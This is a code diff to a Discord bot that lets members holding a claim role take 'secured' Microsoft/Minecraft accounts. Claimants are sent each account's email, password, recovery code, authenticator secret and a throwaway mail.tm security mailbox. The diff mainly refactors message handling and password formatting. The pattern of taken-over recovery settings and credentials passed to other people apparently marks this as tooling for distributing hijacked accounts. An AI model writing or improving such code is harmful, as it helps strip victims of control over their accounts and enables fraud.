@@ -6,6 +6,7 @@ from typing import TYPE_CHECKING
 
 import discord
 
+from shared import interactions
 from ui import theme
 
 if TYPE_CHECKING:
@@ -25,38 +26,66 @@ def _clean(value: object) -> str:
     return text
 
 
+def _clean_password(value: object) -> str:
+    """A password exactly as it is stored.
+
+    A mailbox password may contain any character, so nothing is trimmed or
+    escaped here - only the ``('pw',)`` row tuple SQLite hands back is
+    unwrapped, which is what used to show up as ``('iRXurXiBTpUyCX',)`` in
+    the temporary-password field.
+    """
+    if isinstance(value, (tuple, list)):
+        value = value[0] if value else ""
+    if value is None:
+        return ""
+    return str(value)
+
+
+def _code(value: object) -> str:
+    """One-line code block, the style every other credential field uses.
+
+    The fence grows when the value itself contains backticks so the password
+    is never truncated or reformatted.
+    """
+    text = str(value if value is not None else "")
+    fence = "```"
+    while fence in text:
+        fence += "`"
+    return f"{fence}{text}{fence}"
+
+
 def build_claim_embed(account: dict, temp_password: str = "") -> discord.Embed:
     """Private DM payload for someone who pressed Claim."""
     ms = account.get("microsoft") or {}
     email = _clean(ms.get("email"))
     password = _clean(ms.get("password"))
     temp_email = _clean(ms.get("security_email"))
-    temp_password = _clean(temp_password)
+    temp_password = _clean_password(temp_password) or "N/A"
 
     embed = discord.Embed(
         title="An account has been secured",
         color=GREEN,
     )
-    embed.add_field(name="Email", value=f"```{email}```", inline=False)
-    embed.add_field(name="Password", value=f"```{password}```", inline=True)
-    embed.add_field(name="Temp Email", value=f"```{temp_email}```", inline=True)
-    embed.add_field(name="Temp Password", value=f"`{temp_password}`", inline=True)
+    embed.add_field(name="Email", value=_code(email), inline=False)
+    embed.add_field(name="Password", value=_code(password), inline=True)
+    embed.add_field(name="Temp Email", value=_code(temp_email), inline=True)
+    embed.add_field(name="Temp Password", value=_code(temp_password), inline=True)
     embed.add_field(
         name="Recovery Code",
-        value=f"```{_clean(ms.get('recovery_code'))}```",
+        value=_code(_clean(ms.get("recovery_code"))),
         inline=False,
     )
     auth = _clean(ms.get("auth_secret"))
     if auth != "N/A":
-        embed.add_field(name="Authenticator Secret", value=f"```{auth}```", inline=False)
+        embed.add_field(name="Authenticator Secret", value=_code(auth), inline=False)
 
     if temp_email != "N/A":
         embed.add_field(
             name="Temp Email login (mail.tm)",
             value=(
                 f"Address: `{temp_email}`\n"
-                f"Password: `{temp_password}`"
-                "\n1. Open https://mail.tm\n"
+                f"Password: `{temp_password}`\n\n"
+                "1. Open [mail.tm](https://mail.tm)\n"
                 "2. Sign in with the address and password above\n"
                 "3. Open the Microsoft email to read the verification code"
             ),
@@ -206,15 +235,19 @@ class ClaimButton(discord.ui.View):
         """Modal submit: the IGN must match the account (or the account is open)."""
         entered = str(entered or "").strip()
         if not entered:
-            await interaction.response.send_message(
-                "Enter the account's Minecraft username to claim it.", ephemeral=True
+            await interactions.respond(
+                interaction,
+                content="Enter the account's Minecraft username to claim it.",
+                ephemeral=True,
             )
             return
 
         expected = self._stored_mc_name()
         if expected and entered.lower() != expected.lower():
-            await interaction.response.send_message(
-                "That Minecraft username does not match this account.", ephemeral=True
+            await interactions.respond(
+                interaction,
+                content="That Minecraft username does not match this account.",
+                ephemeral=True,
             )
             return
 
@@ -223,39 +256,44 @@ class ClaimButton(discord.ui.View):
     async def interaction_check(self, interaction: Interaction) -> bool:
         claims_enabled = self._claim_enabled()
         if not claims_enabled:
-            await interaction.response.send_message(
-                "Unclaimed-account claims are disabled right now.",
+            await interactions.respond(
+                interaction,
+                content="Unclaimed-account claims are disabled right now.",
                 ephemeral=True,
             )
             return False
 
         role_id = self._claim_role_id()
         if role_id is None:
-            await interaction.response.send_message(
-                "Claim role is not configured.",
+            await interactions.respond(
+                interaction,
+                content="Claim role is not configured.",
                 ephemeral=True,
             )
             return False
 
         guild = interaction.guild
         if guild is None:
-            await interaction.response.send_message(
-                "Claims can only be made in a server.",
+            await interactions.respond(
+                interaction,
+                content="Claims can only be made in a server.",
                 ephemeral=True,
             )
             return False
 
         role = guild.get_role(role_id)
         if role is None:
-            await interaction.response.send_message(
-                "The configured claim role does not exist in this server.",
+            await interactions.respond(
+                interaction,
+                content="The configured claim role does not exist in this server.",
                 ephemeral=True,
             )
             return False
 
         if role not in interaction.user.roles:
-            await interaction.response.send_message(
-                "You do not have the claim role to claim this account.",
+            await interactions.respond(
+                interaction,
+                content="You do not have the claim role to claim this account.",
                 ephemeral=True,
             )
             return False
@@ -289,8 +327,9 @@ class ClaimButton(discord.ui.View):
             already_name = None
             if already:
                 already_name = already.get("claimed_by_username")
-            await interaction.response.send_message(
-                f"This account was already claimed by {already_name or 'someone'}.",
+            await interactions.respond(
+                interaction,
+                content=f"This account was already claimed by {already_name or 'someone'}.",
                 ephemeral=True,
             )
             return
@@ -309,8 +348,9 @@ class ClaimButton(discord.ui.View):
             # A modal submit must be acknowledged itself; the card lives on the
             # message the button was pressed on.
             try:
-                await interaction.response.send_message(
-                    "Claimed - check your DMs for the account details.",
+                await interactions.respond(
+                    interaction,
+                    content="Claimed - check your DMs for the account details.",
                     ephemeral=True,
                 )
             except Exception:
@@ -323,14 +363,14 @@ class ClaimButton(discord.ui.View):
                 log.warning("claim: could not update the public card", exc_info=True)
         else:
             try:
-                await interaction.response.edit_message(
-                    view=card, allowed_mentions=mentions
+                await interactions.edit(
+                    interaction, view=card, allowed_mentions=mentions
                 )
                 updated = True
             except Exception:
                 log.warning("claim: could not update the public card", exc_info=True)
                 if not interaction.response.is_done():
-                    await interaction.response.defer(ephemeral=True)
+                    await interactions.defer(interaction, ephemeral=True)
 
         if not updated:
             log.warning("claim: public card was not updated for %s", self.account_id)
@@ -344,8 +384,9 @@ class ClaimButton(discord.ui.View):
             log.exception("claim: could not load secured account %s", self.account_id)
 
         if not account:
-            await interaction.followup.send(
-                "Claimed, but the stored account details could not be found.",
+            await interactions.followup(
+                interaction,
+                content="Claimed, but the stored account details could not be found.",
                 ephemeral=True,
             )
             return
@@ -361,10 +402,13 @@ class ClaimButton(discord.ui.View):
         try:
             await interaction.user.send(embed=build_claim_embed(account, temp_password))
         except discord.Forbidden:
-            await interaction.followup.send(
-                "Claimed, but I could not DM you the details. Enable direct "
-                "messages from server members and ask an admin to unclaim it, "
-                "then press Claim again.",
+            await interactions.followup(
+                interaction,
+                content=(
+                    "Claimed, but I could not DM you the details. Enable direct "
+                    "messages from server members and ask an admin to unclaim it, "
+                    "then press Claim again."
+                ),
                 ephemeral=True,
             )
         except Exception:
@@ -381,8 +425,9 @@ class ClaimButton(discord.ui.View):
         role_id = self._claim_role_id()
 
         if not claims_enabled or role_id is None:
-            await interaction.response.send_message(
-                "Claims are not configured.",
+            await interactions.respond(
+                interaction,
+                content="Claims are not configured.",
                 ephemeral=True,
             )
             return
@@ -391,15 +436,20 @@ class ClaimButton(discord.ui.View):
         if guild is not None:
             role = guild.get_role(role_id)
             if role is None or role not in interaction.user.roles:
-                await interaction.response.send_message(
-                    "You do not have permission to claim this account.",
+                await interactions.respond(
+                    interaction,
+                    content="You do not have permission to claim this account.",
                     ephemeral=True,
                 )
                 return
 
         if self.already_claimed_by_user_id is not None:
-            await interaction.response.send_message(
-                f"This account is already claimed by {self.already_claimed_by_username or 'someone'}.",
+            await interactions.respond(
+                interaction,
+                content=(
+                    f"This account is already claimed by "
+                    f"{self.already_claimed_by_username or 'someone'}."
+                ),
                 ephemeral=True,
             )
             return
@@ -407,7 +457,7 @@ class ClaimButton(discord.ui.View):
         # Optional gate: make the claimant type the account's Minecraft username
         # before the claim goes through (claims.require_minecraft_username).
         if self._require_mc_username():
-            await interaction.response.send_modal(ClaimUsernameModal(self))
+            await interactions.send_modal(interaction, ClaimUsernameModal(self))
             return
 
         # Persistent button: claim role is already verified by interaction_check.
